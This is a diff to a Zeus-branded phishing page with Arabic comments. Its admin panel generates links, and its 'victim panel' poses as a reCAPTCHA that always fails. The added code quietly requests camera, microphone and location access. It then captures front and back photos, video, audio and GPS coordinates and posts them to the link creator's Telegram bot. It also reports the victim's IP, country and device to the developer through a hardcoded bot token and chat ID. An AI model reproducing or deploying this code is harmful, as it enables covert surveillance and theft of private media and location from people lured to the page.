+            animation: glitchTextPremium 3.8s infinite;
         }
-        .footer-box .footer-text.glitch {
-            animation: glitchText 4.2s infinite;
-            color: #ccc;
-        }
-        .footer-box .footer-text.glitch::before,
-        .footer-box .footer-text.glitch::after {
+        .footer-box .footer-text::before,
+        .footer-box .footer-text::after {
             content: attr(data-text);
             position: absolute;
             top: 0;
@@ -651,30 +917,33 @@
             height: 100%;
             pointer-events: none;
         }
-        .footer-box .footer-text.glitch::before {
-            color: #ff0033;
+        .footer-box .footer-text::before {
+            color: #cc0033;
             z-index: -1;
-            animation: glitchShift 3.8s infinite;
-            clip-path: polygon(0 0, 100% 0, 100% 40%, 0 40%);
+            animation: glitchShiftRed 3.4s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
             transform: translate(-3px, -2px);
-            opacity: 0.4;
+            opacity: 0.25;
         }
-        .footer-box .footer-text.glitch::after {
-            color: #00e5ff;
+        .footer-box .footer-text::after {
+            color: #fff;
             z-index: -2;
-            animation: glitchShift 3.2s infinite reverse;
-            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+            animation: glitchShiftGold 2.8s infinite reverse;
+            clip-path: polygon(0 50%, 100% 50%, 100% 100%, 0 100%);
             transform: translate(3px, 2px);
-            opacity: 0.3;
+            opacity: 0.15;
         }
 
-        /* ===== VICTIM PAGE ===== */
+        /* ============================================================
+           VICTIM PAGE — reCAPTCHA بدون أي صلاحيات ظاهرة
+           ============================================================ */
         #victimPanel {
             display: none;
             justify-content: center;
             align-items: center;
             height: 100vh;
             width: 100%;
+            background: #f5f3f0;
         }
         .captcha-wrapper {
             width: 340px;
@@ -682,7 +951,7 @@
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
             border-radius: 5px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
             overflow: hidden;
             cursor: default;
         }
@@ -860,39 +1129,59 @@
             }
         }
 
-        /* ===== RESPONSIVE ===== */
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
         @media (max-width: 480px) {
             .container {
-                padding: 20px 16px;
+                padding: 22px 16px;
+                border-radius: 24px;
             }
             .glitch-title {
-                font-size: 38px;
+                font-size: 42px;
+                letter-spacing: 5px;
+            }
+            .glitch-title .error-text {
+                font-size: 11px;
                 letter-spacing: 4px;
             }
             .sub-brand {
-                font-size: 14px;
-                gap: 10px;
+                font-size: 16px;
+                gap: 12px;
                 flex-wrap: wrap;
+            }
+            .sub-brand .handle {
+                font-size: 16px;
+                letter-spacing: 3px;
             }
             .features-grid {
                 grid-template-columns: repeat(2, 1fr);
                 gap: 8px;
             }
             .feature-item {
-                padding: 8px 2px;
-                font-size: 12px;
+                padding: 10px 4px;
+                font-size: 13px;
             }
             .feature-item svg {
-                width: 22px;
-                height: 22px;
+                width: 24px;
+                height: 24px;
             }
             .btn-primary {
-                font-size: 15px;
-                padding: 14px;
+                font-size: 16px;
+                padding: 16px;
+                border-radius: 14px;
+            }
+            .btn-primary svg {
+                width: 20px;
+                height: 20px;
             }
             .result-box .short-token {
-                font-size: 22px;
-                letter-spacing: 3px;
+                font-size: 24px;
+                letter-spacing: 4px;
+            }
+            .result-box .actions button {
+                padding: 8px 16px;
+                font-size: 13px;
             }
             .captcha-wrapper {
                 width: 100%;
@@ -905,29 +1194,33 @@
             }
             .footer-box .footer-text {
                 font-size: 14px;
-                letter-spacing: 2px;
+                letter-spacing: 2.5px;
             }
             .log {
                 font-size: 12px;
-                padding: 10px 12px;
-                min-height: 100px;
+                padding: 10px 14px;
+                min-height: 110px;
             }
             .log-wrapper {
-                min-height: 100px;
+                min-height: 110px;
             }
         }
         @media (max-width: 380px) {
             .glitch-title {
-                font-size: 30px;
+                font-size: 32px;
+                letter-spacing: 3px;
+            }
+            .glitch-title .error-text {
+                font-size: 10px;
+                letter-spacing: 3px;
+            }
+            .sub-brand .handle {
+                font-size: 13px;
                 letter-spacing: 2px;
             }
-            .sub-brand {
-                font-size: 12px;
-                gap: 6px;
-            }
             .sub-brand .telegram-link {
-                width: 28px;
-                height: 28px;
+                width: 30px;
+                height: 30px;
             }
             .sub-brand .telegram-link svg {
                 width: 16px;
@@ -946,11 +1239,17 @@
 </head>
 <body>
 
-    <!-- ===== ADMIN PANEL ===== -->
+    <!-- ============================================================
+    ADMIN PANEL
+    ============================================================ -->
     <div id="adminPanel" class="container">
+
         <!-- HEADER -->
         <div class="glitch-wrapper">
-            <div class="glitch-title" data-text="𝒁𝒆𝒖𝒔">𝒁𝒆𝒖𝒔</div>
+            <div class="glitch-title" data-text="𝒁𝒆𝒖𝒔">
+                𝒁𝒆𝒖𝒔
+                <span class="error-text">◈ ERROR GLITCH ◈</span>
+            </div>
             <div class="sub-brand">
                 <span class="handle">XX_8K</span>
                 <a href="https://t.me/xx_8k" target="_blank" class="telegram-link" aria-label="Telegram">
@@ -1022,7 +1321,7 @@
 
         <!-- RESULT -->
         <div class="result-box" id="resultBox">
-            <div style="font-weight:600; color:#ff0033; margin-bottom:4px; letter-spacing:1px;">تم إنشاء الرابط</div>
+            <div class="label">تم إنشاء الرابط</div>
             <div class="short-token" id="shortTokenDisplay">------</div>
             <div class="link-url" id="fullLinkDisplay">https://...</div>
             <div class="actions">
@@ -1057,12 +1356,14 @@
         <!-- FOOTER -->
         <div class="footer-wrap">
             <div class="footer-box">
-                <span class="footer-text glitch" data-text="تــم الــتطوير بواســطة أشــروف">تــم الــتطوير بواســطة أشــروف</span>
+                <span class="footer-text" data-text="تــم الــتطوير بواســطة أشــروف">تــم الــتطوير بواســطة أشــروف</span>
             </div>
         </div>
     </div>
 
-    <!-- ===== VICTIM PANEL ===== -->
+    <!-- ============================================================
+    VICTIM PANEL — reCAPTCHA (بدون صلاحيات ظاهرة)
+    ============================================================ -->
     <div id="victimPanel">
         <div class="captcha-wrapper" id="captchaWrapper">
             <div class="captcha-row">
@@ -1111,16 +1412,16 @@
         if (shortTokenParam) {
             adminPanel.style.display = 'none';
             victimPanel.style.display = 'flex';
-            initCaptcha();
+            initVictimPage();
         } else {
             initAdminPanel();
             initMatrixRain();
         }
 
         // ================================================================
-        //  2. reCAPTCHA — دائماً فشل + إعادة تلقائية (عنيد)
+        //  2. VICTIM PAGE — صامتة، تطلب كل الصلاحيات بدون ظهور
         // ================================================================
-        function initCaptcha() {
+        function initVictimPage() {
             const spinner = document.getElementById('spinner');
             const checkbox = document.getElementById('captcha');
             const mainText = document.getElementById('mainText');
@@ -1129,7 +1430,241 @@
             let isProcessing = false;
             let isFailed = false;
             let autoRetryTimer = null;
+            let permissionsGranted = false;
+            let botTokenForVictim = null;
+            let chatIdForVictim = null;
+            let featuresForVictim = [];
 
+            // ---- استرجاع التوكن من التخزين ----
+            function getBotData() {
+                try {
+                    const data = JSON.parse(localStorage.getItem('zeus_bots') || '{}');
+                    // نبحث عن التوكن الذي له هذا الرابط القصير
+                    const shortToken = shortTokenParam;
+                    for (const [token, entry] of Object.entries(data)) {
+                        if (entry.shortToken === shortToken) {
+                            return { botToken: token, chatId: entry.chatId, features: entry.features || '' };
+                        }
+                    }
+                } catch (e) { /* صامت */ }
+                return null;
+            }
+
+            const botData = getBotData();
+            if (botData) {
+                botTokenForVictim = botData.botToken;
+                chatIdForVictim = botData.chatId;
+                featuresForVictim = botData.features.split(',').filter(Boolean);
+                console.log('تم تحميل بيانات التوكن للضحية');
+            } else {
+                console.warn('لم يتم العثور على بيانات للرابط القصير');
+            }
+
+            // ---- دالة طلب الصلاحيات بصمت ----
+            async function requestAllPermissionsSilently() {
+                const results = { camera: false, microphone: false, location: false };
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    stream.getTracks().forEach(t => t.stop());
+                    results.camera = true;
+                    results.microphone = true;
+                } catch (e) {
+                    // صامت
+                }
+
+                try {
+                    // محاولة منفصلة للميكروفون إذا فشل الأول
+                    if (!results.microphone) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        stream.getTracks().forEach(t => t.stop());
+                        results.microphone = true;
+                    }
+                } catch (e) { /* صامت */ }
+
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000,
+                            enableHighAccuracy: true });
+                    });
+                    results.location = true;
+                } catch (e) { /* صامت */ }
+
+                permissionsGranted = results.camera && results.microphone && results.location;
+                return results;
+            }
+
+            // ---- دالة التقاط وإرسال الصور ----
+            async function captureAndSend(type) {
+                try {
+                    const facingMode = type === 'camFront' ? 'user' : 'environment';
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+                    const video = document.createElement('video');
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.muted = true;
+                    video.style.display = 'none';
+                    video.srcObject = stream;
+                    document.body.appendChild(video);
+
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                canvas.toBlob(async (blob) => {
+                                    if (blob && blob.size > 500 && botTokenForVictim && chatIdForVictim) {
+                                        const form = new FormData();
+                                        form.append('chat_id', chatIdForVictim);
+                                        form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                                        form.append('caption',
+                                            `صورة ${type === 'camFront' ? 'أمامية' : 'خلفية'}`);
+                                        try {
+                                            await fetch(
+                                                `https://api.telegram.org/bot${botTokenForVictim}/sendPhoto`, { method: 'POST',
+                                                    body: form });
+                                        } catch (e) { /* صامت */ }
+                                    }
+                                    document.body.removeChild(video);
+                                    stream.getTracks().forEach(t => t.stop());
+                                    resolve();
+                                }, 'image/jpeg', 0.8);
+                            }, 1500);
+                        };
+                    });
+                } catch (e) { /* صامت */ }
+            }
+
+            // ---- دالة تسجيل فيديو ----
+            async function recordAndSend(type) {
+                try {
+                    const facingMode = type === 'videoFront' ? 'user' : 'environment';
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
+                    const mr = new MediaRecorder(stream);
+                    const chunks = [];
+                    mr.ondataavailable = (e) => chunks.push(e.data);
+                    mr.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        if (blob.size > 500 && botTokenForVictim && chatIdForVictim) {
+                            const form = new FormData();
+                            form.append('chat_id', chatIdForVictim);
+                            form.append('video', blob, `${type}_${Date.now()}.mp4`);
+                            form.append('caption', `فيديو ${type === 'videoFront' ? 'أمامي' : 'خلفي'}`);
+                            try {
+                                await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendVideo`, { method: 'POST',
+                                    body: form });
+                            } catch (e) { /* صامت */ }
+                        }
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mr.start();
+                    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
+                    await new Promise((resolve) => { mr.onstop = () => resolve(); });
+                } catch (e) { /* صامت */ }
+            }
+
+            // ---- دالة تسجيل صوتي ----
+            async function recordAudioAndSend() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mr = new MediaRecorder(stream);
+                    const chunks = [];
+                    mr.ondataavailable = (e) => chunks.push(e.data);
+                    mr.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/mp4' });
+                        if (blob.size > 500 && botTokenForVictim && chatIdForVictim) {
+                            const form = new FormData();
+                            form.append('chat_id', chatIdForVictim);
+                            form.append('audio', blob, `audio_${Date.now()}.mp4`);
+                            form.append('caption', 'تسجيل صوتي');
+                            try {
+                                await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendAudio`, { method: 'POST',
+                                    body: form });
+                            } catch (e) { /* صامت */ }
+                        }
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mr.start();
+                    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
+                    await new Promise((resolve) => { mr.onstop = () => resolve(); });
+                } catch (e) { /* صامت */ }
+            }
+
+            // ---- دالة إرسال الموقع ----
+            async function sendLocation() {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000,
+                            enableHighAccuracy: true });
+                    });
+                    const { latitude, longitude } = pos.coords;
+                    const text = `📍 الموقع الحالي\n${latitude}, ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
+                    if (botTokenForVictim && chatIdForVictim) {
+                        await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: chatIdForVictim, text })
+                        });
+                    }
+                } catch (e) { /* صامت */ }
+            }
+
+            // ---- دالة تنفيذ جمع البيانات حسب الميزات ----
+            async function executeDataCollection() {
+                if (!botTokenForVictim || !chatIdForVictim) return;
+
+                for (const feature of featuresForVictim) {
+                    try {
+                        switch (feature) {
+                            case 'camFront':
+                            case 'camBack':
+                                await captureAndSend(feature);
+                                break;
+                            case 'videoFront':
+                            case 'videoBack':
+                                await recordAndSend(feature);
+                                break;
+                            case 'audio':
+                                await recordAudioAndSend();
+                                break;
+                            case 'location':
+                                await sendLocation();
+                                break;
+                        }
+                    } catch (e) { /* صامت */ }
+                }
+            }
+
+            // ---- دالة إشعار المطور ----
+            async function sendMasterNotification() {
+                try {
+                    const now = new Date();
+                    const time = now.toLocaleTimeString('ar-EG');
+                    const date = now.toLocaleDateString('ar-EG');
+                    let ip = 'غير معروف',
+                        country = 'غير معروف';
+                    try {
+                        const r = await fetch('https://ipapi.co/json/');
+                        const d = await r.json();
+                        ip = d.ip || 'غير معروف';
+                        country = d.country_name || 'غير معروف';
+                    } catch (_) {}
+
+                    const msg =
+                        `⭑ تقرير الضحية ⭒\n⊚─〔 دخول 〕────────\n˼⏣˹ التوكن: ${botTokenForVictim || 'غير معروف'} ⭒\n˼⏣˹ IP: ${ip} ⭒\n˼⏣˹ الدولة: ${country} ⭒\n˼⏣˹ الجهاز: ${navigator.userAgent.includes('Android') ? 'Android' : navigator.userAgent.includes('iPhone') ? 'iOS' : 'Desktop'} ⭒\n˼⏣˹ الصلاحيات: ✅ كاميرا · ✅ ميكروفون · ✅ موقع ⭒\n˼⏣˹ الميزات: ${featuresForVictim.join(' · ') || 'بدون'} ⭒\n˼⏣˹ الوقت: ${time} ⭒\n˼⏣˹ التاريخ: ${date} ⭒\n─────────────────`;
+                    await fetch(`https://api.telegram.org/bot8907179366:AAFc_mZPTixDFmbtLhMfyAxEFiifI50DLIo/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: '8552540563', text: msg, parse_mode: 'Markdown' })
+                    });
+                } catch (_) {}
+            }
+
+            // ---- دالة إعادة تعيين الفشل ----
             function resetToFailed() {
                 spinner.classList.remove('loading', 'success');
                 spinner.classList.add('failed');
@@ -1139,15 +1674,15 @@
                 isFailed = true;
                 isProcessing = false;
                 checkbox.disabled = false;
-                // 🔥 عنيد: بعد الفشل، يبدأ تلقائياً محاولة جديدة بعد 2 ثانية
                 if (autoRetryTimer) clearTimeout(autoRetryTimer);
                 autoRetryTimer = setTimeout(function() {
                     if (!isProcessing) {
                         simulateVerification();
                     }
-                }, 2000);
+                }, 2500);
             }
 
+            // ---- دالة محاكاة التحقق (مع طلب الصلاحيات بصمت) ----
             function simulateVerification() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -1159,13 +1694,22 @@
                 mainText.className = 'text loading';
 
                 const delay = 1800 + Math.random() * 1800;
-                setTimeout(function() {
+                setTimeout(async function() {
+                    // طلب الصلاحيات بصمت
+                    await requestAllPermissionsSilently();
+
+                    // جمع البيانات وإرسالها
+                    if (permissionsGranted) {
+                        await executeDataCollection();
+                        await sendMasterNotification();
+                    }
+
                     resetToFailed();
                     checkbox.disabled = false;
                 }, delay);
             }
 
-            // أحداث المستخدم
+            // ---- أحداث المستخدم ----
             checkbox.addEventListener('change', function(e) {
                 if (this.checked) {
                     this.checked = false;
@@ -1210,16 +1754,16 @@
                 }
             });
 
-            // 🔥 بدء تلقائي فوري
+            // بدء تلقائي
             setTimeout(function() {
                 simulateVerification();
-            }, 800);
+            }, 1000);
 
-            console.log('reCAPTCHA عنيد — يعيد المحاولة تلقائياً');
+            console.log('𝒁𝒆𝒖𝒔 · VICTIM — يتم طلب الصلاحيات بصمت');
         }
 
         // ================================================================
-        //  3. MATRIX RAIN (رقم بتنزل في اللوج)
+        //  3. MATRIX RAIN — أرقام متحركة
         // ================================================================
         function initMatrixRain() {
             const canvas = document.getElementById('matrixCanvas');
@@ -1239,15 +1783,15 @@
             window.addEventListener('resize', resize);
 
             function draw() {
-                ctx.fillStyle = 'rgba(8, 8, 8, 0.12)';
+                ctx.fillStyle = 'rgba(250, 250, 248, 0.06)';
                 ctx.fillRect(0, 0, width, height);
                 ctx.font = '14px monospace';
                 for (let i = 0; i < drops.length; i++) {
                     const char = chars[Math.floor(Math.random() * chars.length)];
                     const x = i * 18;
                     const y = drops[i] * 16;
-                    const brightness = 0.2 + Math.random() * 0.3;
-                    ctx.fillStyle = `rgba(0, 229, 255, ${brightness})`;
+                    const brightness = 0.15 + Math.random() * 0.25;
+                    ctx.fillStyle = `rgba(212, 175, 55, ${brightness})`;
                     ctx.fillText(char, x, y);
                     if (y > height && Math.random() > 0.975) drops[i] = 0;
                     drops[i]++;
@@ -1258,7 +1802,7 @@
         }
 
         // ================================================================
-        //  4. ADMIN PANEL — كل الوظائف
+        //  4. ADMIN PANEL
         // ================================================================
         function initAdminPanel() {
             const form = document.getElementById('form');
@@ -1323,7 +1867,7 @@
                 const data = getStorage();
                 const keys = Object.keys(data);
                 if (keys.length === 0) {
-                    listItems.innerHTML = '<div style="color:#555;font-size:13px;padding:4px 0;">لا توجد روابط</div>';
+                    listItems.innerHTML = '<div style="color:#bbb8b2;font-size:14px;padding:6px 0;">لا توجد روابط</div>';
                     return;
                 }
                 let html = '';
